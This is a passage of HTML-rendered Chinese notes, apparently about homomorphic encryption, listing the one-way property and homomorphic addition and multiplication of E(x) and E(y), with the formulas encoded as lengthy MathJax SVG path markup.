113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4201.7,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> 也不同</li>\n<li>给定 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"4.783ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 2114 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D438\" d=\"M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(764,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1153,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1725,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> 的值，很难反推出\n<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.025ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.294ex\" height=\"1.025ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 572 453\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g></g></g></svg></mjx-container></span> 的值</li>\n<li>给定 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"4.783ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 2114 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D438\" d=\"M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(764,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1153,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1725,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> 和 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"4.597ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 2032 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D438\" d=\"M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(764,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1153,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1643,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> 的值，可以很容易的计算出来：\n<ul>\n<li>同态加法：通过 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"4.783ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 2114 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D438\" d=\"M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(764,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1153,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1725,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> 和 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"4.597ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 2032 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D438\" d=\"M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(764,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1153,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1643,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> 计算 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"8.657ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 3826.4 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D438\" d=\"M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(764,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1153,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1947.2,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2947.4,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3437.4,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> 的值</li>\n<li>同态乘法：通过 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"4.783ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 2114 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D438\" d=\"M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(764,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1153,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1725,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> 和 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"4.597ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 2032 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D438\" d=\"M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(764,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1153,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1643,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> 计算 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"5.891ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 2604 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D438\" d=\"M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(764,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1153,0)\"><path 